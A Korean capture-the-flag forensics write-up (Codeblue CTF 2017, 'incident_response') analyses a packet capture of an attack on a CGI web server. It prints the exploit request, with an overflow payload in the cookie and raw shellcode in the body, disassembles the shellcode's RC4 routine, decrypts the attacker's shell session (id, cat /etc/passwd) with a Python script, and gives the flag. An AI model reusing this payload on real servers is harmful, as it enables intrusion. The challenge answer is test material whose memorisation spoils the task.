# [MISC] Codeblue CTF 2017 - incident_response

# Description

We found some strange activities on our web server.
Can you find out what happened?

# Analysis

주어진 파일을 압축 해제하면 log.pcap파일이 나오니 열어보자.

tcp관련 패킷이 많은데 그 중 14번째 TCP 스트림을 보면 다음과 같이 되어있다.

```
GET /cgi-bin/index.cgi HTTP/1.1
Host: 172.17.0.2
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Cookie: sessid=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJ%0f@%00%00%00%00%00%00%00%00%00%00%00%00%00%01%00%00%00%00%00%00%00`%20`%00%00%00%00%00%0a%00%00%00%00%00%00%00%00!`%00%00%00%00%00%00%00%00%00%00%00%00%000%0f@%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00J%0f@%00%00%00%00%00%00%00%00%00%00%00%00%00%01%00%00%00%00%00%00%00%00!`%00%00%00%00%00%07%00%00%00%00%00%00%00%00%10%00%00%00%00%00%00%00%20`%00%00%00%00%000%0f@%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00J%0f@%00%00%00%00%00%00%00%00%00%00%00%00%00%01%00%00%00%00%00%00%00`%20`%00%00%00%00%00%07%04%00%00%00%00%00%00%00!`%00%00%00%00%00%00%00%00%00%00%00%00%000%0f@%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00!`%00%00%00%00%00
Content-Length: 1041

F	@............H1....H1.H.....H.........H.........H..	...I.....H.........H..!......H..)......H..*......H..9......H..;......H..<.....H..=...I.....f........USH..H./dev/ura1.H...H..H..$.D$.ndom.D$...V...H..... ......6......H...H...[].....G...........1...D..H...H=....u.1.1...@.D..D..H.....E..D...D.......D..L..H..D.L..H...D.D..H=....u...f.f.........H..L...tG..........W...........L........W.D..L..D.L...L...L.......D..0.H...I9.u.....@.f.........AWAV1.AUAT.!...USH......H..$....H.D$`....H.D$h....H.D$p....H.D$x....H..H.D$P....H.D$X.....H..L...........1................H.\$`H.t$P......zi..f.T$P.......f.L$RA...D$T...
L.t$@.....H...$.... ...H..D.......H..H...Y...E1.A......".............1......H..H.D$0H.D$.H.D$ H.D$.H..$....H.D$.f..D.......H..D...%...H........H=....t.....H..H..H...M...H.|$..(....K.....A..tg.|$4...... ..@.H..H..H.......L..H..D........|$0.....H.......H..I..u..|$0.....H.t$.1.1.D........T.....@.H./bin/sh.1..D$".H.D$@.-c..L..$....f.D$ H.D$.H..$....H..$........H..$.....P....|$0.G....|$4......Z...H.t$.1.L...s...............1..j...HTTP/1.1 500 Internal Server Error
Date: Fri, 26 May 2017 03:04:43 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 608
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 172.17.0.2 Port 80</address>
</body></html>
```

딱 봐도 뭔가 수상해보이지 않는가.

```
F	@............H1....H1.H.....H.........H.........H..	...I.....H.........H..!......H..)......H..*......H..9......H..;......H..<.....H..=...I.....f........USH..H./dev/ura1.H...H..H..$.D$.ndom.D$...V...H..... ......6......H...H...[].....G...........1...D..H...H=....u.1.1...@.D..D..H.....E..D...D.......D..L..H..D.L..H...D.D..H=....u...f.f.........H..L...tG..........W...........L........W.D..L..D.L...L...L.......D..0.H...I9.u.....@.f.........AWAV1.AUAT.!...USH......H..$....H.D$`....H.D$h....H.D$p....H.D$x....H..H.D$P....H.D$X.....H..L...........1................H.\$`H.t$P......zi..f.T$P.......f.L$RA...D$T...
L.t$@.....H...$.... ...H..D.......H..H...Y...E1.A......".............1......H..H.D$0H.D$.H.D$ H.D$.H..$....H.D$.f..D.......H..D...%...H........H=....t.....H..H..H...M...H.|$..(....K.....A..tg.|$4...... ..@.H..H..H.......L..H..D........|$0.....H.......H..I..u..|$0.....H.t$.1.1.D........T.....@.H./bin/sh.1..D$".H.D$@.-c..L..$....f.D$ H.D$.H..$....H..$........H..$.....P....|$0.G....|$4......Z...H.t$.1.L...s...............1..j...
```

이 부분은 파일로 저장하여 아이다를 통해 32비트로 열어보았으나 말도안되는 명령어들과 syscall을 보고 다시 64비트로 열어보았다.

아... 코드가 이쁘게 잘 나온다.

그중 0xEA위치의 함수를 보면 다음과 같다.

```
seg000:00000000000000EA RC4_init        proc near               ; CODE XREF: main+D2↓p
seg000:00000000000000EA                 mov     dword ptr [rdi+4], 0
seg000:00000000000000F1                 mov     dword ptr [rdi], 0
seg000:00000000000000F7                 xor     eax, eax
seg000:00000000000000F9                 nop
seg000:00000000000000FA
seg000:00000000000000FA loc_FA:                                 ; CODE XREF: RC4_init+1E↓j
seg000:00000000000000FA                 mov     [rdi+rax+8], al
seg000:00000000000000FE                 add     rax, 1
seg000:0000000000000102                 cmp     rax, 100h
seg000:0000000000000108                 jnz     short loc_FA
seg000:000000000000010A                 xor     eax, eax
seg000:000000000000010C                 xor     edx, edx
seg000:000000000000010E                 nop     dword ptr [rax+00h]
seg000:0000000000000112
seg000:0000000000000112 loc_112:                                ; CODE XREF: RC4_init+60↓j
seg000:0000000000000112                 movzx   r8d, byte ptr [rdi+rax+8]
seg000:0000000000000118                 mov     rcx, rax
seg000:000000000000011B                 and     ecx, 1Fh
seg000:000000000000011E                 mov     r10d, r8d
seg000:0000000000000121                 add     r10b, [rsi+rcx]
seg000:0000000000000125                 mov     ecx, r10d
seg000:0000000000000128                 add     edx, ecx
seg000:000000000000012A                 movzx   ecx, dl
seg000:000000000000012D                 movzx   r9d, byte ptr [rdi+rcx+8]
seg000:0000000000000133                 mov     rdx, rcx
seg000:0000000000000136                 mov     [rdi+rax+8], r9b
seg000:000000000000013B                 add     rax, 1
seg000:000000000000013F                 mov     [rdi+rcx+8], r8b
seg000:0000000000000144                 cmp     rax, 100h
seg000:000000000000014A                 jnz     short loc_112
seg000:000000000000014C                 rep retn
seg000:000000000000014C RC4_init        endp
```

어디서 많이 본 형태가 보인다 했더니 RC4 스트림 암호 알고리즘 이었다.

하지만 여기서는 키를 /dev/urandom값으로 가져오는 것을 확인할 수 있다.

```
seg000:000000000000009A sub_9A          proc near               ; CODE XREF: main+B7↓p
seg000:000000000000009A
seg000:000000000000009A var_28          = qword ptr -28h
seg000:000000000000009A var_20          = dword ptr -20h
seg000:000000000000009A var_1C          = byte ptr -1Ch
seg000:000000000000009A
seg000:000000000000009A                 push    rbp
seg000:000000000000009B                 push    rbx
seg000:000000000000009C                 mov     rbp, rdi
seg000:000000000000009F                 mov     rax, 'aru/ved/'
seg000:00000000000000A9                 xor     esi, esi
seg000:00000000000000AB                 sub     rsp, 18h
seg000:00000000000000AF                 mov     rdi, rsp
seg000:00000000000000B2                 mov     [rsp+28h+var_28], rax
seg000:00000000000000B6                 mov     [rsp+28h+var_20], 'modn'
seg000:00000000000000BE                 mov     [rsp+28h+var_1C], 0
seg000:00000000000000C3                 call    fopen
seg000:00000000000000C8                 mov     rsi, rbp
seg000:00000000000000CB                 mov     ebx, eax
seg000:00000000000000CD                 mov     edx, 20h ; ' '
seg000:00000000000000D2                 mov     edi, eax
seg000:00000000000000D4                 call    fread
seg000:00000000000000D9                 mov     edi, ebx
seg000:00000000000000DB                 call    fclose
seg000:00000000000000E0                 add     rsp, 18h
seg000:00000000000000E4                 pop     rbx
seg000:00000000000000E5                 pop     rbp
seg000:00000000000000E6                 retn
seg000:00000000000000E6 sub_9A          endp
```

# Exploit

바이너리에서는 키를 찾을 수 없으므로 패킷상에 있을것으로 추정하여 패킷을 보았으며, 15번째 TCP 스트림을 보면 다음과 같다.

```



b0f870fb7587c0482bb7f7c1f7391f9e66de2cd92558ca1f87f2df232fedc7da

50bd
953b7affd918323a332832e112beeca946307d3354d53cbdc4c1cc80353a253d88bf1469b7d1f30d17964cb5195f4c7e15e1215b5e24
10b6f8
48c80c813ace2792d4bd18751bbbfc4915
3c1814ac38a9
1d3db574ae8a0213874514c19e2dcf5132c0b4c615db673136722a2a2dad9f2f91f684fea89d603b0f9d22165b9508e08b823a3cad6985b913aab1f3adff7472c822f086d916233e6c1ffdaa5f9f43e19bb47ccda2e9fcd0a8cdbe88fba22f39d0cb014b769915b74383f6f960b750459c9e2ca6023bb19855b44308291c877427ee2d5d321a99ba6b6e8abcd1358a5df76946c3170ae262ac
c9af426676ee77a5d10ca0a32205b3027725
c5491fcb60229b3c52561f98
9ac554e8176f917e59e28401db8ea0
bb7d76d768edfc82c4e69a201133b6e28a84b21d28a2fe71e38b2baf4dec420b5a617bd1de09b40c6fae700b84eef36a95d560b194731288b39d6b616f17a9a1e322b1f22999055fced501be0cf2e2de1305818690aee8a1e12eee5a364ab61aedd9da4c1ea3ae939bbdefa217da4d7764810f87cb321b770b78faad9d6fd18bbd2a691d455c3192dae73fa4e339260ca57c44f39094b7b6b3c437a9e059b74ff754b1168e62e3813d9ae9e8edaccd2a897d729597819bba22fa60663799d045179e2681b4b30d090f3f9af4fcf5e0204c33216b0b6c1534d2d07aa4ffb4acd39b5e452895f61dcb7b23ee9d2484a0a51f85d539f9997a44ac834d7c306415a332ab97a61a963b22ddee168301b1e99c3a0eb214c1b6e9ad672b014aaea65fe6e443e9939d3af040c6048a25c3a6d0f81711bda17c322a833eca2099d42188a8a735a4d128060056cc926fabc1ac0c84fe2e67e154cc62e9c9e3ff7915a31b5faac637c904e81ec469aee0dad71bdc9c7d748acede163898fc97cf1a69697254d9395738b4eb970ef9c44cbefd3b75f2fa020ec83672a3e6c778fcfffa5131f429ec15241e721e6efb19b1bf3531fbe0b8321b1ed35fdebc193bc217dfe32f24755b5c7fce826ae5ae6514a07dd1444c5acfb7ca66da9ec1b58d6135ff4585a06b7bce94e8e55d660b297ad3fd6f9417c7b41c3e62c2589a343e832cf4d7a7a5d643874f43d7f0864a48b3b3773d4a42ca29071ef3f05d52582a7ebc84bcacebe55075d33adc463f9cd66926349ce38d44000676bf3c8355419891b221b473da4733d66a0532b2df5908af866cf613dd2ae6b7b2748c1e32888519628e6f60ea64e666df5e14906b6bb50a900c2505a8f463b85a52a7e383d72a77d6eda1a8f2939bbfb89b46a76964bcbbbe64e5e24bef3a29757c9d9d102841f2e3bedbd8fdbb3bdfdcd2808369252b5b637e05c4e8985f9e80a70c6c2e93281c093503ac7b846a4aa17c6fd15c3b7883a19cf0758b28db6ec37db200fa36b481dd6dc1d0c29ab9438f639ed83ff924366bde2f48cdb0f1907138c16ac99de27efd3f9bdf360681ef8f986e5010cca10f35498148536d98dfde32af9d080c56acf7c8ea3a64fa6f507663e8473995887476b85070380659e88e5e0fe6d2ca6fee805ec4e62a6ce6a61d09e96431bba08bb5255504f71758ea7bd9f1f51d4751101a2295e98069be0bf525bea5b06ec37ec98c2ab9ee94503362b6c06dc7a9b5aaeb0945983f1be8375f2130c0b0a9c57faaa955934267e36f7590cf86a0b60f3fb2bea49240193b01dec92f5e9d09a16b6545dc85d75aef9a7f9f744155bb02db4c1159f91cb45b74801de978a1b67cf1e421899b46ec997f72ac02c62f0822ee1177a4d25a913452e24c46a278ff87a0e3739117187ca8922b60c246e7a04cc963bb2dc725eb96f6b45fe199caf290cb4a965d5bd70daf465ba6c002302c1749645ca31dfd45161d3f341eabd271b9153401ffced0a1769710a625597a7642e5192452610e310667a7453a34ff36eaa0c94ade4f3e95995f6ac988b2a6c43ed1fb0e9a03c60e0e72776c70e235745f233c051b28f9ec12ce541304f5db22ea0cc0c091e24f27ba17f8a5038ae16f56b4cbda086a2d461a1d0fbfe3cf5d92c17c05a8780c56527f7754d64fac79a03d56e2e8f3d34152fad20bd06060c0de7b6e9c0ff48d4b8221af5ba90b4fdb69ecec8187657aa20bff611c5e98ca
aa425aa7d096a935
6299644889fd6215a8933b2865ce6ca2c03880c9ae45a81f6eb8aa8108e61357e39ba8dc919affbb9a6737997363525cfdcf206cd688e89a2fbf93a85fc20150d4d4f2fb96673599dc6c79e83cf517a82880665114a85fc5025e98475762857ca4bf40fe758c55962689a16012945f7644977a0a9028ff410708943b0e61837320966fe98075699a31f4f56a65a65e177b745af0fa3d3d96de5a81ae6b97ded5111cd041befbaeb7466372a21e67354df3ef642a789789d371c782d1425808be4063e0d8903e865925f15cf913dc419c951ab56cf8f3ced0ad88fbacfd23e2e62651a5cb2385cdfe8929ab6574d1c631f7247b1fbf3c50a0d1e8134ad6251c44fd99adf3bee629b7f19412523ac25a24ef64c4e2a2782b4a17f65f547681ed57e68749f2df3e280d6cae06edae4fc36deeeaee86a14246522f6bb5941f88b7bc04e3fe833022439a035dba3e3249a4a4473dee2c5c91537c9f742c4e398cc8d909cb8fb322f6f9e8ffd1073ad7eef65982ccc2bec93713cb393756ea4cc246ace389e2e0cc257d8b08f6112b4d60d52b6eae0d148e9e6992a6fed1c18ec636d63544c50356caddbd4de19aeebe5d31f5262629300e37ea28d28303bba05b7f36d8814583376bf8558f16f85371d38fa0ea1013fdf49431274c30ded9bd7830f78b841666bd703a4cd8b27db313bff8ed4debebea9d33aeef5b94e90cf7b3848737f05fa6651e11cc8407217a5a46140801b7f2db43f15909d24a5c082d40aa43132f1ff65cac00f478bba177d778576c101dfcd26f4e15cbfaf5ee602bc11026b8edd9a7483a4ba4e5cbcb120cd18399b5234fd2a7b61a384d5c88017a7bdeb295cce59535b75fc78639ba04e5f7b6b3195a45737ae1703a6ace8d8fe8b50b53b3da01cd203f30cb727560d290ac3d1f201e6ca02742e16fae482cef0a0d0de2e0dde1479d12ccbe4ff7dcb3cc7810deea29dfff007df53f7fcb68f1aa8ecabbb9d0c8f05f368905dd4c0f42eed430d4dccecf09b09b4d31ec1bdba8823a297729ae355a99bcadbe15538f335726cbf1fff57796bf0f52c0daaf8c1d2d4f1431d78570e7baf312ee0764e555d873a7e811052cc6e47e750a5b6a626bcc5123b26574f3f5ec6872f3bc99ab7bf537c091d2529999d84f205f5739448682d68e18d1bb7b249a719f1802ca91f4e6711c16e1390d631f32bb6dc8e283232036394c6b8e0050039dae836b0db8670634b20bedd5470e7cd0eea317bffb4d2304154c54fad6180e5061b289ee0741dd793b2fa5faae563954f2e9cd8da77e191b0520b245d80433aab776252d4baf703a70f108bf5dc9a9aaf1fc165410702e5897b3399a6d9443d9ab03194256f231377da6564ecc03799bb3fba7e6cae850a972fe51089bcb3a6a332aaebafacf200cd33594aa63968e73784d61d67d9f5522277b887ce551e4178fcb364b70d9237cf2fc9719eddcc2ced5b242614db45a3d94712f3b64d266791e6e9de4e97d6970485604ba3581053ac00424489a44d514d3df0648e0bbb5b777f5bf33c5018eeb666024d17ce7ec48e363cf8bab6c93a288a04750f4cfd212b06e2022cc86d6bc0ce24a99b848d11cf94a7d0f7d82450a41ffc721
ac3b5ba0a1c471556d55a00d
a705d310cf6d3e7fcb42a96eb7d86037fb4aa1148319e18f175a61fb0b9835b7662ca7de3b5c698901b948deab751e38995e76d8ee1d8522639a2ba2d76b8930041a549690c18e9aa5874a53dc83345803de8b15b72e963526a559cd27bc5247a01be33077a14c8f69016549b05e5ca12e6ad4d5148be4bd3e2a921947074d59633765cb759c73d0f1a6aeaf7af1bc7c33
66a0c4e817d6b9885fcd508e86059a2bce
3517b5e09dcefc4ad50b99ef64415103bdf6c309b71011b007763203df4c0323b783b99879a47d3e5a094b55b6d489602849ff00f8f6a6ccbb96c07149b55ded578b07692ad13b2ea26293981e70e055e692617f780b4d84c6c22a234a39882bf813768664804733769c00d9980d921993150b80ad152e6c2d1bd0f8152f6bbcd2994bace26e32d86895031bf5f1c4eb18c3
5b7cae1a1988757eab086f1eaa040e0dff7c0eefd0798e
3822d899e87b5e3a3488c8147dc0ac7cdb6f6669d13e4869686219b062e754931fa5af19647326e2c10355bb4397b6
```

음 뭔가 굉장히 암호가 된거처럼 보이지 않는가.

맨 처음에 따로 나온 32바이트 `b0f870fb7587c0482bb7f7c1f7391f9e66de2cd92558ca1f87f2df232fedc7da`를 Key로 하고 그 뒷부분을 암호화 된 문장으로 취급해 복호화를 하였다.

```python
from Crypto.Cipher import ARC4

key = 'b0f870fb7587c0482bb7f7c1f7391f9e66de2cd92558ca1f87f2df232fedc7da'.decode('hex')
encrypted = '''50bd
953b7affd918323a332832e112beeca946307d3354d53cbdc4c1cc80353a253d88bf1469b7d1f30d17964cb5195f4c7e15e1215b5e24
10b6f8
48c80c813ace2792d4bd18751bbbfc4915
3c1814ac38a9
1d3db574ae8a0213874514c19e2dcf5132c0b4c615db673136722a2a2dad9f2f91f684fea89d603b0f9d22165b9508e08b823a3cad6985b913aab1f3adff7472c822f086d916233e6c1ffdaa5f9f43e19bb47ccda2e9fcd0a8cdbe88fba22f39d0cb014b769915b74383f6f960b750459c9e2ca6023bb19855b44308291c877427ee2d5d321a99ba6b6e8abcd1358a5df76946c3170ae262ac
c9af426676ee77a5d10ca0a32205b3027725
c5491fcb60229b3c52561f98
9ac554e8176f917e59e28401db8ea0
bb7d76d768edfc82c4e69a201133b6e28a84b21d28a2fe71e38b2baf4dec420b5a617bd1de09b40c6fae700b84eef36a95d560b194731288b39d6b616f17a9a1e322b1f22999055fced501be0cf2e2de1305818690aee8a1e12eee5a364ab61aedd9da4c1ea3ae939bbdefa217da4d7764810f87cb321b770b78faad9d6fd18bbd2a691d455c3192dae73fa4e339260ca57c44f39094b7b6b3c437a9e059b74ff754b1168e62e3813d9ae9e8edaccd2a897d729597819bba22fa60663799d045179e2681b4b30d090f3f9af4fcf5e0204c33216b0b6c1534d2d07aa4ffb4acd39b5e452895f61dcb7b23ee9d2484a0a51f85d539f9997a44ac834d7c306415a332ab97a61a963b22ddee168301b1e99c3a0eb214c1b6e9ad672b014aaea65fe6e443e9939d3af040c6048a25c3a6d0f81711bda17c322a833eca2099d42188a8a735a4d128060056cc926fabc1ac0c84fe2e67e154cc62e9c9e3ff7915a31b5faac637c904e81ec469aee0dad71bdc9c7d748acede163898fc97cf1a69697254d9395738b4eb970ef9c44cbefd3b75f2fa020ec83672a3e6c778fcfffa5131f429ec15241e721e6efb19b1bf3531fbe0b8321b1ed35fdebc193bc217dfe32f24755b5c7fce826ae5ae6514a07dd1444c5acfb7ca66da9ec1b58d6135ff4585a06b7bce94e8e55d660b297ad3fd6f9417c7b41c3e62c2589a343e832cf4d7a7a5d643874f43d7f0864a48b3b3773d4a42ca29071ef3f05d52582a7ebc84bcacebe55075d33adc463f9cd66926349ce38d44000676bf3c8355419891b221b473da4733d66a0532b2df5908af866cf613dd2ae6b7b2748c1e32888519628e6f60ea64e666df5e14906b6bb50a900c2505a8f463b85a52a7e383d72a77d6eda1a8f2939bbfb89b46a76964bcbbbe64e5e24bef3a29757c9d9d102841f2e3bedbd8fdbb3bdfdcd2808369252b5b637e05c4e8985f9e80a70c6c2e93281c093503ac7b846a4aa17c6fd15c3b7883a19cf0758b28db6ec37db200fa36b481dd6dc1d0c29ab9438f639ed83ff924366bde2f48cdb0f1907138c16ac99de27efd3f9bdf360681ef8f986e5010cca10f35498148536d98dfde32af9d080c56acf7c8ea3a64fa6f507663e8473995887476b85070380659e88e5e0fe6d2ca6fee805ec4e62a6ce6a61d09e96431bba08bb5255504f71758ea7bd9f1f51d4751101a2295e98069be0bf525bea5b06ec37ec98c2ab9ee94503362b6c06dc7a9b5aaeb0945983f1be8375f2130c0b0a9c57faaa955934267e36f7590cf86a0b60f3fb2bea49240193b01dec92f5e9d09a16b6545dc85d75aef9a7f9f744155bb02db4c1159f91cb45b74801de978a1b67cf1e421899b46ec997f72ac02c62f0822ee1177a4d25a913452e24c46a278ff87a0e3739117187ca8922b60c246e7a04cc963bb2dc725eb96f6b45fe199caf290cb4a965d5bd70daf465ba6c002302c1749645ca31dfd45161d3f341eabd271b9153401ffced0a1769710a625597a7642e5192452610e310667a7453a34ff36eaa0c94ade4f3e95995f6ac988b2a6c43ed1fb0e9a03c60e0e72776c70e235745f233c051b28f9ec12ce541304f5db22ea0cc0c091e24f27ba17f8a5038ae16f56b4cbda086a2d461a1d0fbfe3cf5d92c17c05a8780c56527f7754d64fac79a03d56e2e8f3d34152fad20bd06060c0de7b6e9c0ff48d4b8221af5ba90b4fdb69ecec8187657aa20bff611c5e98ca
aa425aa7d096a935
6299644889fd6215a8933b2865ce6ca2c03880c9ae45a81f6eb8aa8108e61357e39ba8dc919affbb9a6737997363525cfdcf206cd688e89a2fbf93a85fc20150d4d4f2fb96673599dc6c79e83cf517a82880665114a85fc5025e98475762857ca4bf40fe758c55962689a16012945f7644977a0a9028ff410708943b0e61837320966fe98075699a31f4f56a65a65e177b745af0fa3d3d96de5a81ae6b97ded5111cd041befbaeb7466372a21e67354df3ef642a789789d371c782d1425808be4063e0d8903e865925f15cf913dc419c951ab56cf8f3ced0ad88fbacfd23e2e62651a5cb2385cdfe8929ab6574d1c631f7247b1fbf3c50a0d1e8134ad6251c44fd99adf3bee629b7f19412523ac25a24ef64c4e2a2782b4a17f65f547681ed57e68749f2df3e280d6cae06edae4fc36deeeaee86a14246522f6bb5941f88b7bc04e3fe833022439a035dba3e3249a4a4473dee2c5c91537c9f742c4e398cc8d909cb8fb322f6f9e8ffd1073ad7eef65982ccc2bec93713cb393756ea4cc246ace389e2e0cc257d8b08f6112b4d60d52b6eae0d148e9e6992a6fed1c18ec636d63544c50356caddbd4de19aeebe5d31f5262629300e37ea28d28303bba05b7f36d8814583376bf8558f16f85371d38fa0ea1013fdf49431274c30ded9bd7830f78b841666bd703a4cd8b27db313bff8ed4debebea9d33aeef5b94e90cf7b3848737f05fa6651e11cc8407217a5a46140801b7f2db43f15909d24a5c082d40aa43132f1ff65cac00f478bba177d778576c101dfcd26f4e15cbfaf5ee602bc11026b8edd9a7483a4ba4e5cbcb120cd18399b5234fd2a7b61a384d5c88017a7bdeb295cce59535b75fc78639ba04e5f7b6b3195a45737ae1703a6ace8d8fe8b50b53b3da01cd203f30cb727560d290ac3d1f201e6ca02742e16fae482cef0a0d0de2e0dde1479d12ccbe4ff7dcb3cc7810deea29dfff007df53f7fcb68f1aa8ecabbb9d0c8f05f368905dd4c0f42eed430d4dccecf09b09b4d31ec1bdba8823a297729ae355a99bcadbe15538f335726cbf1fff57796bf0f52c0daaf8c1d2d4f1431d78570e7baf312ee0764e555d873a7e811052cc6e47e750a5b6a626bcc5123b26574f3f5ec6872f3bc99ab7bf537c091d2529999d84f205f5739448682d68e18d1bb7b249a719f1802ca91f4e6711c16e1390d631f32bb6dc8e283232036394c6b8e0050039dae836b0db8670634b20bedd5470e7cd0eea317bffb4d2304154c54fad6180e5061b289ee0741dd793b2fa5faae563954f2e9cd8da77e191b0520b245d80433aab776252d4baf703a70f108bf5dc9a9aaf1fc165410702e5897b3399a6d9443d9ab03194256f231377da6564ecc03799bb3fba7e6cae850a972fe51089bcb3a6a332aaebafacf200cd33594aa63968e73784d61d67d9f5522277b887ce551e4178fcb364b70d9237cf2fc9719eddcc2ced5b242614db45a3d94712f3b64d266791e6e9de4e97d6970485604ba3581053ac00424489a44d514d3df0648e0bbb5b777f5bf33c5018eeb666024d17ce7ec48e363cf8bab6c93a288a04750f4cfd212b06e2022cc86d6bc0ce24a99b848d11cf94a7d0f7d82450a41ffc721
ac3b5ba0a1c471556d55a00d
a705d310cf6d3e7fcb42a96eb7d86037fb4aa1148319e18f175a61fb0b9835b7662ca7de3b5c698901b948deab751e38995e76d8ee1d8522639a2ba2d76b8930041a549690c18e9aa5874a53dc83345803de8b15b72e963526a559cd27bc5247a01be33077a14c8f69016549b05e5ca12e6ad4d5148be4bd3e2a921947074d59633765cb759c73d0f1a6aeaf7af1bc7c33
66a0c4e817d6b9885fcd508e86059a2bce
3517b5e09dcefc4ad50b99ef64415103bdf6c309b71011b007763203df4c0323b783b99879a47d3e5a094b55b6d489602849ff00f8f6a6ccbb96c07149b55ded578b07692ad13b2ea26293981e70e055e692617f780b4d84c6c22a234a39882bf813768664804733769c00d9980d921993150b80ad152e6c2d1bd0f8152f6bbcd2994bace26e32d86895031bf5f1c4eb18c3
5b7cae1a1988757eab086f1eaa040e0dff7c0eefd0798e
3822d899e87b5e3a3488c8147dc0ac7cdb6f6669d13e4869686219b062e754931fa5af19647326e2c10355bb4397b6
'''.split('\n')

rc4 = ARC4.new(key)

for b in encrypted:
	a = b.decode('hex')
	print rc4.decrypt(a)
```

```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

pwd
/usr/lib/cgi-bin

ls -la
total 24
drwxr-xr-x  2 root root  4096 May 26 02:39 .
drwxr-xr-x 52 root root  4096 May 26 02:39 ..
-rwxrwxr-x  1 root root 13704 Apr 18 01:11 index.cgi

echo 'pwned! yay!'
pwned! yay!

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false

ls -la /
total 80
drwxr-xr-x  67 root root 4096 May 26 03:04 .
drwxr-xr-x  67 root root 4096 May 26 03:04 ..
-rwxr-xr-x   1 root root    0 May 26 03:00 .dockerenv
drwxr-xr-x   2 root root 4096 May 26 02:39 bin
drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
drwxr-xr-x  15 root root 3780 May 26 03:00 dev
drwxr-xr-x 116 root root 4096 May 26 03:00 etc
drwxr-xr-x   4 root root 4096 May 26 02:39 home
drwxr-xr-x  15 root root 4096 May 26 02:39 lib
drwxr-xr-x   2 root root 4096 May  2 08:41 lib32
drwxr-xr-x   2 root root 4096 May  2 08:39 lib64
drwxr-xr-x   2 root root 4096 Feb 14 23:28 media
drwxr-xr-x   2 root root 4096 Feb 14 23:28 mnt
drwxr-xr-x   2 root root 4096 Feb 14 23:28 opt
dr-xr-xr-x 174 root root    0 May 26 03:00 proc
drwx------  11 root root 4096 May 26 03:04 root
drwxr-xr-x   9 root root 4096 May 26 03:00 run
drwxr-xr-x   2 root root 4096 May 26 02:39 sbin
drwxrwxr-x   5 1000 1000 4096 May 26 03:04 share
drwxr-xr-x   2 root root 4096 Feb 14 23:28 srv
dr-xr-xr-x  13 root root    0 May 24 07:44 sys
drwxrwxrwt   2 root root 4096 May 26 03:00 tmp
drwxr-xr-x  27 root root 4096 May 26 02:39 usr
drwxr-xr-x  21 root root 4096 May 26 03:00 var

ls -la /home
total 12
drwxr-xr-x  4 root root 4096 May 26 02:39 .
drwxr-xr-x 67 root root 4096 May 26 03:04 ..
drwxr-xr-x  2 root root 4096 May 26 02:39 user

ls -la /home/user
total 12
drwxr-xr-x 2 root root 4096 May 26 02:39 .
drwxr-xr-x 4 root root 4096 May 26 02:39 ..
-rw-rw-r-- 1 root root   47 May 26 02:38 flag.txt

cat /home/user/flag.txt
CBCTF{7RAcKINg_H4ckERs_f00tPrINTs_i5_excItING}
```

오 플래그를 얻을 수 있었다.



**CBCTF{7RAcKINg_H4ckERs_f00tPrINTs_i5_excItING}**